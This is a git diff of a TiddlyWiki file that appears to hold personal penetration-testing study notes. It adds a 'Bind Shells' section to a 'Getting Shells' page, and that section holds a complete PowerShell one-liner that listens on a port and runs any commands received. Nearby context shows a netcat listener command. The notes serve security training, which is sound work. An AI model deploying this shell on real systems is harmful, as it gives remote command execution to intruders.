@@ -10065,7 +10065,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211107040111810" list="Tech Operations/IT [[Cyber Security]] [[Getting Shells]] Pivoting CrappyMakerProgrammer" modified="20211107134240337" title="$:/StoryList">
+<div created="20211108150900041" list="[[Cyber Security]] [[Getting Shells]] CrappyMakerProgrammer" modified="20211108150910207" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -12094,7 +12094,7 @@ Most popular Game Engines
 
 </pre>
 </div>
-<div created="20210901154708454" modified="20211107134330071" title="Getting Shells">
+<div created="20210901154708454" modified="20211108151000350" title="Getting Shells">
 <pre>! SSH Keys
 
 From https://mqt.gitbook.io/oscp-notes/ssh-keys
@@ -12144,6 +12144,15 @@ nc -nlvp &lt;port&gt;
 ```
 
 For Metasploit, Use and set up the `exploit/multi/handler` module
+
+! Bind Shells
+
+Usually not recommended because requires bypassing firewalls
+
+```
+C:\Users\admin\Desktop&gt;powershell -c &quot;$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',441);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()&quot; 
+
+```
 
 ! Upgrading Shells
 
